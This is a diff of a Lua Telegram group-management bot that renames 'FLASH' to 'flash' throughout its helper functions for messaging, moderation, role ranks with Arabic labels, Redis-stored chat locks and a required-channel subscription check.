---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Do Notify
 function do_notify(user, msg)
 local n = notify.Notification.new(user, msg)
 n:show ()
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Chat Kick
 function chat_kick(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, "Kicked")
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Get Parse Mode
 function getParseMode(parse_mode)
 if parse_mode then
@@ -447,7 +447,7 @@ P = {ID = "TextParseModeMarkdown"}
 elseif mode == 'html' then
 P = {ID = "TextParseModeHTML"}
 end end return P end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Get Message
 function getMessage(chat_id, message_id,cb)
 tdcli_function ({
@@ -456,7 +456,7 @@ chat_id_ = chat_id,
 message_id_ = message_id
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Send Contact
 function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
 tdcli_function ({
@@ -476,7 +476,7 @@ last_name_ = last_name,
 user_id_ = user_id
 },},}, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Send Photo
 function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
 tdcli_function ({
@@ -496,7 +496,7 @@ caption_ = caption
 },
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
 tdcli_function({
 ID = request_id,
@@ -526,7 +526,7 @@ disable_notification_ = 0,
 from_background_ = 1
 }, cb or dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getChats(offset_order, offset_chat_id, limit, cb, cmd)
 if not limit or limit > 20 then
 limit = 20
@@ -538,21 +538,21 @@ offset_chat_id_ = offset_chat_id or 0,
 limit_ = limit
 }, cb or dl_cb, cmd)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getUserFull(user_id,cb)
 tdcli_function ({
 ID = "GetUserFull",
 user_id_ = user_id
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function vardump(value)
 print(serpent.block(value, {comment=false}))
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function dl_cb(arg, data)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function delete_msg(chatid ,mid)
 tdcli_function ({
 ID = "DeleteMessages",
@@ -560,8 +560,8 @@ chat_id_ = chatid,
 message_ids_ = mid
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
-function FLASHdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
+--     By Developer flash     -- 
+function flashdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
 local TextParseMode = getParseMode(parse_mode)
 tdcli_function ({
 ID = "SendMessage",
@@ -580,7 +580,7 @@ parse_mode_ = TextParseMode,
 },
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function sendaction(chat_id, action, progress)
 tdcli_function ({
 ID = "SendChatAction",
@@ -591,7 +591,7 @@ progress_ = progress or 100
 }
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function changetitle(chat_id, title)
 tdcli_function ({
 ID = "ChangeChatTitle",
@@ -599,7 +599,7 @@ chat_id_ = chat_id,
 title_ = title
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
 local TextParseMode = getParseMode(parse_mode)
 tdcli_function ({
@@ -617,7 +617,7 @@ parse_mode_ = TextParseMode,
 },
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function setphoto(chat_id, photo)
 tdcli_function ({
 ID = "ChangeChatPhoto",
@@ -625,7 +625,7 @@ chat_id_ = chat_id,
 photo_ = getInputFile(photo)
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function add_user(chat_id, user_id, forward_limit)
 tdcli_function ({
 ID = "AddChatMember",
@@ -634,28 +634,28 @@ user_id_ = user_id,
 forward_limit_ = forward_limit or 50
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function unpinmsg(channel_id)
 tdcli_function ({
 ID = "UnpinChannelMessage",
 channel_id_ = getChatId(channel_id).ID
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function blockUser(user_id)
 tdcli_function ({
 ID = "BlockUser",
 user_id_ = user_id
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function unblockUser(user_id)
 tdcli_function ({
 ID = "UnblockUser",
 user_id_ = user_id
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getBlockedUsers(offset, limit)
 tdcli_function ({
 ID = "GetBlockedUsers",
@@ -663,16 +663,16 @@ offset_ = offset,
 limit_ = limit
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function delmsg(arg,data)
 for k,v in pairs(data.messages_) do
 delete_msg(v.chat_id_,{[0] = v.id_})
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function chat_del_user(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, 'Editor')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function s_api(web) 
 local info, res = https.request(web) 
 local req = json:decode(info) if res ~= 200 then 
@@ -681,7 +681,7 @@ end
 if not req.ok then 
 return false 
 end return req end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function sendText(chat_id, text, reply_to_message_id, markdown) 
 send_api = "https://api.telegram.org/bot"..tokenbot 
 local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
@@ -695,7 +695,7 @@ url = url.."&parse_mode=HTML"
 end 
 return s_api(url)  
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function send_inline(chat_id,text,keyboard,inline,reply_id) 
 local response = {} 
 response.keyboard = keyboard 
@@ -709,7 +709,7 @@ send_api = send_api.."&reply_to_message_id="..reply_id
 end 
 return s_api(send_api) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getChannelMembers(channel_id, offset, filter, limit)
 if not limit or limit > 200 then
 limit = 200
@@ -724,7 +724,7 @@ offset_ = offset,
 limit_ = limit
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getChannelFull(channel_id)
 tdcli_function ({
 ID = "GetChannelFull",
@@ -737,7 +737,7 @@ ID = "GetChannelFull",
 channel_id_ = getChatId(channel_id).ID
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function chek_bots(channel,cb)
 local function callback_admins(extra,result,success)
 limit = (result.member_count_ )
@@ -745,7 +745,7 @@ getChannelMembers(channel, 0, 'Bots', limit,cb)
 end
 getChannelFull(channel,callback_admins)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getInputMessageContent(file, filetype, caption)
 if file:match('/') or file:match('.') then
 infile = {ID = "InputFileLocal", path_ = file}
@@ -773,14 +773,14 @@ inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
 end
 return inmsg
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getUser(user_id, cb)
 tdcli_function ({
 ID = "GetUser",
 user_id_ = user_id
 }, cb, nil)
 end
---     By Developer FLASH     --
+--     By Developer flash     --
 function GetApi(web) 
 local info, res = https.request(web) 
 local req = json:decode(info) if res ~= 200 then 
@@ -791,9 +791,9 @@ return false
 end 
 return req 
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..tokenbot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function pin(channel_id, message_id, disable_notification) 
 tdcli_function ({ 
 ID = "PinChannelMessage", 
@@ -804,105 +804,105 @@ disable_notification_ = disable_notification
 vardump(data)
 end ,nil) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Local Renk
-local renk_FLASH = function(msg)
+local renk_flash = function(msg)
 if tonumber(msg.sender_user_id_) == tonumber(1488653639) then
-FLASH  = "مبرمج السورس"
+flash  = "مبرمج السورس"
 elseif is_leaderid(msg.sender_user_id_) then
-FLASH  = "المطور الاساسي"
+flash  = "المطور الاساسي"
 elseif is_sudoid(msg.sender_user_id_) then
-FLASH = "المطور الثانوي"
+flash = "المطور الثانوي"
 elseif is_admin(msg.sender_user_id_) then
-FLASH = "المطور الثالث"
+flash = "المطور الثالث"
 elseif is_onall(msg.sender_user_id_) then
-FLASH = "المدير العام"
+flash = "المدير العام"
 elseif is_onall(msg.sender_user_id_) then
-FLASH = "الادمن العام"
+flash = "الادمن العام"
 elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASH = "المنشئ الاساسي"
+flash = "المنشئ الاساسي"
 elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
-FLASH = "المنشئ"
+flash = "المنشئ"
 elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
-FLASH = "المدير"
+flash = "المدير"
 elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASH = "الادمن"
+flash = "الادمن"
 else
-FLASH = "العضو" 
-end return FLASH end
---     By Developer FLASH     -- 
--------- FLASH Renk
-local FLASH_renk = function(user_id,chat_id)
+flash = "العضو" 
+end return flash end
+--     By Developer flash     -- 
+-------- flash Renk
+local flash_renk = function(user_id,chat_id)
 if tonumber(user_id) == tonumber(1488653639) then
-FLASH  = "مبرمج السورس"
+flash  = "مبرمج السورس"
 elseif is_leaderid(user_id) then
-FLASH  = "المطور الاساسي"
+flash  = "المطور الاساسي"
 elseif is_sudoid(user_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:sudo:add"..chat_id) or "المطور الثانوي"
+flash = flashdx1:get(flash.."bot:sudo:add"..chat_id) or "المطور الثانوي"
 elseif is_admin(user_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:sudo3:add"..chat_id) or "المطور الثالث"
+flash = flashdx1:get(flash.."bot:sudo3:add"..chat_id) or "المطور الثالث"
 elseif is_onall(user_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:onall:add"..chat_id) or "المدير العام"
+flash = flashdx1:get(flash.."bot:onall:add"..chat_id) or "المدير العام"
 elseif is_moall(user_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:moall:add"..chat_id) or "الادمن العام"
+flash = flashdx1:get(flash.."bot:moall:add"..chat_id) or "الادمن العام"
 elseif is_monsh(user_id,chat_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:monsh:add"..chat_id) or "المنشئ الاساسي"
+flash = flashdx1:get(flash.."bot:monsh:add"..chat_id) or "المنشئ الاساسي"
 elseif is_monsh2(user_id,chat_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:monsh2:add"..chat_id) or "المنشئ"
+flash = flashdx1:get(flash.."bot:monsh2:add"..chat_id) or "المنشئ"
 elseif is_owner(user_id,chat_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:owner:add"..chat_id) or "المدير"
+flash = flashdx1:get(flash.."bot:owner:add"..chat_id) or "المدير"
 elseif is_momod(user_id,chat_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:momod:add"..chat_id) or "الادمن"
+flash = flashdx1:get(flash.."bot:momod:add"..chat_id) or "الادمن"
 elseif is_vipmem(user_id,chat_id) then
-FLASH = FLASHdx1:get(FLASH.."bot:vepmem:add"..chat_id) or "المميز"
+flash = flashdx1:get(flash.."bot:vepmem:add"..chat_id) or "المميز"
 else
-FLASH = FLASHdx1:get(FLASH.."bot:member:add"..chat_id) or "العضو" 
-end return FLASH end
---     By Developer FLASH     -- 
+flash = flashdx1:get(flash.."bot:member:add"..chat_id) or "العضو" 
+end return flash end
+--     By Developer flash     -- 
 function dxdx(user_id,chat_id)
 if is_leaderid(user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:admins:', user_id) then
+elseif flashdx1:sismember(flash..'bot:admins:', user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:onall:', user_id) then
+elseif flashdx1:sismember(flash..'bot:onall:', user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:moall:', user_id) then
+elseif flashdx1:sismember(flash..'bot:moall:', user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:vpall:', user_id) then
+elseif flashdx1:sismember(flash..'bot:vpall:', user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:monsh:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:monsh:'..chat_id, user_id) then
 var = true
 elseif is_monsh(chat_id, user_id) then
 var = true
-elseif FLASHdx1:sismember(FLASH..'bot:monsh2:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:monsh2:'..chat_id, user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:owners:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:owners:'..chat_id, user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:momod:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:momod:'..chat_id, user_id) then
 var = true  
-elseif FLASHdx1:sismember(FLASH..'bot:vipmem:'..chat_id, user_id) then  
+elseif flashdx1:sismember(flash..'bot:vipmem:'..chat_id, user_id) then  
 var = true  
 else var = false end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function fadx(user_id,chat_id)
 if is_leaderid(user_id) then
 var = 'botow'  
-elseif FLASHdx1:sismember(FLASH..'bot:admins', user_id) then
+elseif flashdx1:sismember(flash..'bot:admins', user_id) then
 var = 'sudo3'  
-elseif FLASHdx1:sismember(FLASH..'bot:monsh:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:monsh:'..chat_id, user_id) then
 var = 'monsh'
-elseif FLASHdx1:sismember(FLASH..'bot:monsh2:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:monsh2:'..chat_id, user_id) then
 var = 'monsh2'
-elseif FLASHdx1:sismember(FLASH..'bot:owners:'..chat_id, user_id) then
+elseif flashdx1:sismember(flash..'bot:owners:'..chat_id, user_id) then
 var = 'owner'  
 else  
 var = 'No'
 end return var end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local function check_filter_words(msg, value)
-local hash = (FLASH..'bot:filters:'..msg.chat_id_)
+local hash = (flash..'bot:filters:'..msg.chat_id_)
 if hash then
-local names = FLASHdx1:hkeys(hash)
+local names = flashdx1:hkeys(hash)
 local text = ''
 local value = value:gsub(' ','')
 for i=1, #names do
@@ -912,7 +912,7 @@ local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getInputFile(file) 
 if file:match("/") then 
 infile = {ID = "InputFileLocal", 
@@ -925,7 +925,7 @@ persistent_id_ = file}
 end 
 return infile 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function GetInputFile(file)  
 local file = file or ""   
 if file:match("/") then  
@@ -936,11 +936,11 @@ else infile={ID="InputFilePersistentId",persistent_id_ = file}
 end 
 return infile 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local getChat = function(chat_id, cb)
 tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
 tdcli_function({
 ID = request_id,
@@ -952,7 +952,7 @@ reply_markup_ = reply_markup,
 input_message_content_ = input_message_content
 }, callback or dl_cb, extra)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
 local input_message_content = {
 ID = "InputMessageVoice",
@@ -963,7 +963,7 @@ caption_ = caption
 }
 sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
 local input_message_content = {
 ID = "InputMessageAudio",
@@ -974,7 +974,7 @@ caption_ = caption
 }
 sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
 local input_message_content = {
 ID = "InputMessageSticker",
@@ -984,7 +984,7 @@ height_ = 0
 }
 sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local function getChannelMembers(channel_id, offset, filter, limit,cb) 
 tdcli_function ({ 
 ID = "GetChannelMembers",
@@ -993,134 +993,134 @@ filter_ = {ID = "ChannelMembers" .. filter},
 offset_ = offset,limit_ = limit}, 
 cb, nil) 
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function addgroup(chat_id) 
-FLASHdx1:sadd("FLASH:addg"..bot_id,chat_id) 
-FLASHdx1:set(FLASH.."bot:enable:"..chat_id, true) 
-FLASHdx1:sadd(FLASH..'bot:groups',chat_id)
+flashdx1:sadd("flash:addg"..bot_id,chat_id) 
+flashdx1:set(flash.."bot:enable:"..chat_id, true) 
+flashdx1:sadd(flash..'bot:groups',chat_id)
 end 
 function remgroup(chat_id) 
-FLASHdx1:srem("FLASH:addg"..bot_id,chat_id) 
-FLASHdx1:del(FLASH.."bot:enable:"..chat_id, true)  FLASHdx1:srem(FLASH..'bot:groups',chat_id)
+flashdx1:srem("flash:addg"..bot_id,chat_id) 
+flashdx1:del(flash.."bot:enable:"..chat_id, true)  flashdx1:srem(flash..'bot:groups',chat_id)
 end
 local function remlockal(chat_id)
-FLASHdx1:del(FLASH..'editmsg'..chat_id) FLASHdx1:del(FLASH..'bot:cmds'..chat_id) FLASHdx1:del(FLASH..'bot:bots:mute'..chat_id) FLASHdx1:del(FLASH..'bot:bots:ban'..chat_id) FLASHdx1:del(FLASH..'keed_bots'..chat_id) FLASHdx1:del(FLASH..'anti-flood:'..chat_id) FLASHdx1:del(FLASH..'bot:pin:mute'..chat_id) FLASHdx1:del(FLASH..'bot:photo:mute'..chat_id) FLASHdx1:del(FLASH..'bot:spam:mute'..chat_id) FLASHdx1:del(FLASH..'bot:video:mute'..chat_id) FLASHdx1:del(FLASH..'bot:document:mute'..chat_id) FLASHdx1:del(FLASH..'bot:inline:mute'..chat_id) FLASHdx1:del(FLASH..'markdown:lock'..chat_id) FLASHdx1:del(FLASH..'bot:gifs:mute'..chat_id) FLASHdx1:del(FLASH..'bot:music:mute'..chat_id) FLASHdx1:del(FLASH..'bot:voice:mute'..chat_id) FLASHdx1:del(FLASH..'bot:links:mute'..chat_id) FLASHdx1:del(FLASH..'bot:location:mute'..chat_id) FLASHdx1:del(FLASH..'tags:lock'..chat_id) FLASHdx1:del(FLASH..'bot:strict'..chat_id) FLASHdx1:del(FLASH..'bot:hashtag:mute'..chat_id) FLASHdx1:del(FLASH..'bot:contact:mute'..chat_id) FLASHdx1:del(FLASH..'bot:webpage:mute'..chat_id) FLASHdx1:del(FLASH..'bot:sticker:mute'..chat_id) FLASHdx1:del(FLASH..'bot:forward:mute'..chat_id)
+flashdx1:del(flash..'editmsg'..chat_id) flashdx1:del(flash..'bot:cmds'..chat_id) flashdx1:del(flash..'bot:bots:mute'..chat_id) flashdx1:del(flash..'bot:bots:ban'..chat_id) flashdx1:del(flash..'keed_bots'..chat_id) flashdx1:del(flash..'anti-flood:'..chat_id) flashdx1:del(flash..'bot:pin:mute'..chat_id) flashdx1:del(flash..'bot:photo:mute'..chat_id) flashdx1:del(flash..'bot:spam:mute'..chat_id) flashdx1:del(flash..'bot:video:mute'..chat_id) flashdx1:del(flash..'bot:document:mute'..chat_id) flashdx1:del(flash..'bot:inline:mute'..chat_id) flashdx1:del(flash..'markdown:lock'..chat_id) flashdx1:del(flash..'bot:gifs:mute'..chat_id) flashdx1:del(flash..'bot:music:mute'..chat_id) flashdx1:del(flash..'bot:voice:mute'..chat_id) flashdx1:del(flash..'bot:links:mute'..chat_id) flashdx1:del(flash..'bot:location:mute'..chat_id) flashdx1:del(flash..'tags:lock'..chat_id) flashdx1:del(flash..'bot:strict'..chat_id) flashdx1:del(flash..'bot:hashtag:mute'..chat_id) flashdx1:del(flash..'bot:contact:mute'..chat_id) flashdx1:del(flash..'bot:webpage:mute'..chat_id) flashdx1:del(flash..'bot:sticker:mute'..chat_id) flashdx1:del(flash..'bot:forward:mute'..chat_id)
 end
 local function addlockal(chat_id)
-FLASHdx1:set(FLASH..'editmsg'..chat_id,true) FLASHdx1:set(FLASH..'bot:cmds'..chat_id,true) FLASHdx1:set(FLASH..'bot:bots:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:bots:ban'..chat_id,true) FLASHdx1:set(FLASH..'keed_bots'..chat_id,true) FLASHdx1:set(FLASH..'anti-flood:'..chat_id,true) FLASHdx1:set(FLASH..'bot:pin:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:inline:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:photo:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:spam:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:video:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:gifs:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:music:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:voice:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:links:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:location:mute'..chat_id,true) FLASHdx1:set(FLASH..'tags:lock'..chat_id,true) FLASHdx1:set(FLASH..'bot:strict'..chat_id,true) FLASHdx1:set(FLASH..'bot:document:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:hashtag:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:contact:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:webpage:mute'..chat_id,true) FLASHdx1:set(FLASH..'bot:sticker:mute'..chat_id,true) FLASHdx1:set(FLASH..'markdown:lock'..chat_id,true) FLASHdx1:set(FLASH..'bot:forward:mute'..chat_id,true)
+flashdx1:set(flash..'editmsg'..chat_id,true) flashdx1:set(flash..'bot:cmds'..chat_id,true) flashdx1:set(flash..'bot:bots:mute'..chat_id,true) flashdx1:set(flash..'bot:bots:ban'..chat_id,true) flashdx1:set(flash..'keed_bots'..chat_id,true) flashdx1:set(flash..'anti-flood:'..chat_id,true) flashdx1:set(flash..'bot:pin:mute'..chat_id,true) flashdx1:set(flash..'bot:inline:mute'..chat_id,true) flashdx1:set(flash..'bot:photo:mute'..chat_id,true) flashdx1:set(flash..'bot:spam:mute'..chat_id,true) flashdx1:set(flash..'bot:video:mute'..chat_id,true) flashdx1:set(flash..'bot:gifs:mute'..chat_id,true) flashdx1:set(flash..'bot:music:mute'..chat_id,true) flashdx1:set(flash..'bot:voice:mute'..chat_id,true) flashdx1:set(flash..'bot:links:mute'..chat_id,true) flashdx1:set(flash..'bot:location:mute'..chat_id,true) flashdx1:set(flash..'tags:lock'..chat_id,true) flashdx1:set(flash..'bot:strict'..chat_id,true) flashdx1:set(flash..'bot:document:mute'..chat_id,true) flashdx1:set(flash..'bot:hashtag:mute'..chat_id,true) flashdx1:set(flash..'bot:contact:mute'..chat_id,true) flashdx1:set(flash..'bot:webpage:mute'..chat_id,true) flashdx1:set(flash..'bot:sticker:mute'..chat_id,true) flashdx1:set(flash..'markdown:lock'..chat_id,true) flashdx1:set(flash..'bot:forward:mute'..chat_id,true)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function formsgg(msgs) 
-local FLASH = ''  
+local flash = ''  
 if msgs < 100 then 
-FLASH = "ضعيف جدا"
+flash = "ضعيف جدا"
 elseif msgs < 250 then 
-FLASH = "ضعيف"
+flash = "ضعيف"
 elseif msgs < 500 then 
-FLASH = "غير متفاعل"
+flash = "غير متفاعل"
 elseif msgs < 750 then 
-FLASH = "متوسط"
+flash = "متوسط"
 elseif msgs < 1000 then 
-FLASH = "متفاعل"
+flash = "متفاعل"
 elseif msgs < 2000 then 
-FLASH = "قمه التفاعل"
+flash = "قمه التفاعل"
 elseif msgs < 3000 then 
-FLASH = "ملك التفاعل"
+flash = "ملك التفاعل"
 elseif msgs < 4000 then 
-FLASH = "اسطوره التفاعل"
+flash = "اسطوره التفاعل"
 elseif msgs < 5000 then 
-FLASH = "نار وشرار" 
+flash = "نار وشرار" 
 elseif msgs < 6000 then 
-FLASH = "جهنم حبي" 
+flash = "جهنم حبي" 
 elseif msgs < 7000 then 
-FLASH = "فول" 
+flash = "فول" 
 elseif msgs < 8000 then 
-FLASH = "معلك لربك" 
+flash = "معلك لربك" 
 elseif msgs < 9000 then 
-FLASH = "حارك الجروب" 
-end return FLASH end
---     By Developer FLASH     -- 
+flash = "حارك الجروب" 
+end return flash end
+--     By Developer flash     -- 
 function title_name(GroupID) 
 tdcli_function({ID ="GetChat",chat_id_=GroupID
 },function(arg,data) 
-FLASHdx1:set(FLASH..'bot:group:name'..GroupID,data.title_) 
+flashdx1:set(flash..'bot:group:name'..GroupID,data.title_) 
 end,nil) 
-return FLASHdx1:get(FLASH..'bot:group:name'..GroupID)  end
---     By Developer FLASH     -- 
-function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = FLASHdx1:get(FLASH..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---     By Developer FLASH     -- 
-function FLASH11(msg)
+return flashdx1:get(flash..'bot:group:name'..GroupID)  end
+--     By Developer flash     -- 
+function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = flashdx1:get(flash..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
+--     By Developer flash     -- 
+function flash11(msg)
 local var = true 
-if FLASHdx1:get(FLASH.."FLASH2") then
-local channel = ''..FLASHdx1:get(FLASH..'FLASH3')..''
+if flashdx1:get(flash.."flash2") then
+local channel = ''..flashdx1:get(flash..'flash3')..''
 local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
 local data = json:decode(url)
 if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
 var = false
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ لا تستطيع استخدام البوت ،\n❅∫ اشترك بقناته لتتمكن من استخدامه ، \n\n❅∫ قناة البوت* : ["..channel.."] \n", 1 , "md")
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ لا تستطيع استخدام البوت ،\n❅∫ اشترك بقناته لتتمكن من استخدامه ، \n\n❅∫ قناة البوت* : ["..channel.."] \n", 1 , "md")
 elseif data.ok then
 return var
 end else return var end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function tdcli_update_callback(data)
-local our_id = FLASHdx1:get(FLASH.."Our_ID") or 0
-local api_id = FLASHdx1:get(FLASH.."Bot:Api_ID") or 0
+local our_id = flashdx1:get(flash.."Our_ID") or 0
+local api_id = flashdx1:get(flash.."Bot:Api_ID") or 0
 if data.ID == "UpdateNewCallbackQuery" then
 local Chat_id = data.chat_id_
 local Msg_id = data.message_id_
 local Text = data.payload_.data_
 if Text == '/UnKed' then
-if FLASHdx1:sismember(FLASH.."FLASHdx1:Un:Ked"..data.chat_id_,data.sender_user_id_) then
+if flashdx1:sismember(flash.."flashdx1:Un:Ked"..data.chat_id_,data.sender_user_id_) then
 https.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-FLASHdx1:srem(FLASH.."FLASHdx1:Un:Ked"..Chat_id,data.sender_user_id_)
+flashdx1:srem(flash.."flashdx1:Un:Ked"..Chat_id,data.sender_user_id_)
 delete_msg(data.chat_id_, {[0] = Msg_id})  
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if data.ID == "UpdateNewMessage" then
 local msg = data.message_
 local d = data.disable_notification_
